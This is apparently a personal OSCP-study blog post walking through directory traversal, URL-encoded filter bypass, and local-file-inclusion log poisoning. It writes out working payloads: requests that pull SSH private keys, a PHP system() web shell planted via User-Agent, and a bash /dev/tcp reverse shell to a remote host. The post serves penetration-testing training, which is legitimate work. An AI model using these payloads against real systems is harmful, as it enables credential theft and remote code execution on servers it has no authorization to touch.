---
title: Common Web App Attacks
date: 2024-02-02 08:15:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Web App Attack tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Common Web App Attacks

## Directory Traversal

### Absolute vs Relative Paths

When referencing an absolute path, specify the the full file system path including subdirectories. The absolute path can be referred to from any location in the filesystem. Since /etc/passwd is in the root directory, we can use it from any location in the filesystem.

Relative paths make use of ../ to move backwards in the filesystem and can be stacked:

```console
$ cat ../../../../etc.passwd
```

We could use this when we don't know what our current working directory is. By using a large number of ../, we can ensure we reach the root file system. 

### Identifying and Exploiting Directory Traversals

In Directory Traversal attacks, we can access sensitive files of web servers. This is possible when web apps do not sanitize user input.

On Linux systems, web server files are typically displayed from the web root /var/www/html. Typically, the webpage http://website.com/afile.html is accessing the file at /var/www/html/afile.html. When web apps are vulnerable to directory traversal, we can access files outside of the web root.

Let's analyze the following link for vulnerabilities: https://website.com/customer/login.php?language=en.html
- login.php - the site uses PHP!
- ?language= - the site contains a language parameter. We should try to navigate to that file directly (https://website.com/home/en.html). If it opens successfully, we can try to use other file names.
- /customer/ - the web root contains a subdirectory

Hypothetically, we may find a link such as: http://website.com/customer/index.php?page=admin.php
- This site uses PHP and has a ?page= parameter.
- PHP uses $_GET to manage variables via a GET request.
- Try: http://website.com/customer/index.php?page=../../../../../../../../../etc/passwd

Web servers are typically ran in the context of a dedicated users, such as www-data, who have limited perms on the system. However, some users and admins set excessive permissions for file access. Due to this, we should always check for SSH keys and their perms.

SSH keys are usually in the home directory of a user in the .ssh folder. 

/etc/passwd contains the home directory path of all users, and we can try to display the content of a user's private key:

http://website.com/customer/index.php?page=../../../../../../../../../home/targetuser/.ssh/id_rsa
- Replace "targetuser" above with a legitimate user listed in /etc/passwd.

Once you identify a vulnerability, don't rely on the browser! Use cURL to avoid the alterations browsers make.

```console
$ curl http://website.com/customer/index.php?page=../../../../../../../../home/targetuser/.ssh/id_rsa
```

Copy and paste the key from ---BEGIN OPENSSH PRIVATE KEY--- to ---END OPENSSH PRIVATE KEY--- into a file called dt_key. 

Change the file permissions of dt_key so that only the user/owner can read the file. This avoids future errors.

```console
$ chmod 400 dt_key
```

Using this key, let's try to connect to the target system via SSH on port 2222. Use the -i parameter to specify the dt_key file.

```console
$ ssh -i dt_key -p 2222 targetuser@website.com
```

### Directory Traversal Attacks on Windows

On Windows, instead of /etc/passwd, we use C:\Windows\System32\drivers\etc\hosts to test directory traversal vulnerabilities. After verifying this works, you can test traversing to other sensitive files. It is generally more difficult to execute directory traversal for system access on Windows than it is on Linux. There is no direct equivalent in Windows to the Linux steps taken above.

Sensitive files are additionally less easy to find on Windows without listing directory contents. To get around this, we should investigate the web app more closely and gather information about the server framework, language, etc.

Once we know about the web server, we can use this information to research paths to sensitive files. Research a server's log paths and web root structure. For example, if a system is running the Internet Information Services (IIS) web server, the logs are located at C:\inetpub\logs\LogFiles\W3SVC1\. We should also always check C:\inetpub\wwwroot\web.config, which might have usernames and passwords.

We may find web apps on Windows which are only vulnerable to directory traversals using backslashes. Always try both when a web app is running on Windows.

### Encoding Special Characters

Let's exploit a directory traversal vuln in Apache 2.4.49, which is exploitable by specifying the cgi-nim directory in the URL. 

```console
$ curl http://111.111.111.111/cgi-bin/../../../../../../../../../../../../../etc/passwd

// some error prevents this?
```

TIP: The ../../../ sequence is often filtered by web application firewalls, web servers, or web apps due to it being a common abuse method.v

To get around this, we can use https://www.w3schools.com/tags/ref_urlencode.asp (aka Percent Encoding). We can leverage ASCII encoding lists that can encode our query, or we can use online converters.

URL encoding is typically used to convert characters in a web request into a internet-transmissable format. Poorly configured filters may block ../ but not %2e@2e/.

If we only encode the periods, we get:

```console
curl http://111.111.111.111/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

## File Inclusion Vulnerabilities

### Local File Inclusion (LFI)

Firstly, mixing up a File Inclusion vuln with a Directory Traversal vuln can result in us missing an opportunity to execute arbitrary code!

Directory Traversal allows us to obtain contents of a file that are not in the server's web root.

File Inclusion allows us to "include" a file in the app's running code, which means we can execute local or remote files.

If we exploit a Directory Traversal vuln on the admin.php file, we'll see the source code. However, if we exploit a File Inclusion vuln, we'll have admin.php executed.

Our goal is to conduct Remote Code Execution (RCE) via a Local File Inclusion vuln, and we will do this with Log Poisoning, which modifies data we send to a webapp so the logs contain executable code. To learn where we control input, we can either read the Apache web server documentation or display the file with LFI.

We can use curl to display the Apache access.log to see the elements that comprise a log entry.

```console
$ curl http://website.com/customer/index.php?page=../../../../../../../../../var/log/apache2/access.log

...
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /customer/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
...
```

It appears, in this case, that the User Agent is part of the log entry. With Burp, we can modify the User Agent to specify what will be written in the access.log to be executed.

After navigating to your target page, go to HTTP History and send the request to Repeater. Modify the User Agent field with some PHP code:

```html
User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
```

To execute this, we need to update the page parameter in the current Burp request with a relative path and a cmd parameter, as seen below. Don't forget to remove the User Agent line to avoid multiple executions.

```html
GET /customer/index.php?page=../../../../../../../../../../var/log/apache2/access.log&cmd=ps HTTP/1.1
```

In the Response section, you will see the output of the executed ps command. If we update the command to ls -la, we will trigger an error, because of the space between the command and the flags! There's a few options for getting around this, like URL encoding or Input Field Separators (IFS). We will use URL encoding:

```html
GET /customer/index.php?page=../../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la HTTP/1.1
```

If this works, we have achieved command execution! We can leverage this to gain reverse shell. Or, we can try to add our SSH key to the authorized_keys file for a user.

Let's first try for a reverse shell:

```html
GET /customer/index.php?page=../../../../../../../../../../var/log/apache2/access.log&cmd=bash -i >& /dev/tcp/111.111.111.111/4444 0>&1 HTTP/1.1
```

We will be executing this via the PHP system function, and it may be executed with the Bourne Shell (sh) instead of Bash. This one-liner above contains syntax that Bourne Shell does not support. To fix this, we need nee to ensure the shell is executed with Bash. Let's provide the command an argument to bash -c.

```html
GET /customer/index.php?page=../../../../../../../../../../var/log/apache2/access.log&cmd=bash -c "bash -i >& /dev/tcp/111.111.111.111/4444 0>&1" HTTP/1.1

// URL Encode!

GET /customer/index.php?page=../../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%111.111.111.111%2F4444%200%3E%261%22
```

Now, before sending this, let's start a netcat listener on 4444.

```console
$ nc -nvlp 4444
```

Send your request in Burp. If successful, we have a reverse shell!

### LFI in Windows

The PHP code we used previously works in Windows, since the PHP system functionis independent from the OS. When Log Poisoning on Windows, we should know that the log files are in app-specific paths. For example, a target running XAMPP has logs in C:\xampp\apache\logs\.

We can also similarly exploit RFI and LFI on frameworks like Perl, Active Server Pages Extended, Active Server Pages, Java Server Pages, and Node.js. We can simply adjust this exploit for different languages.


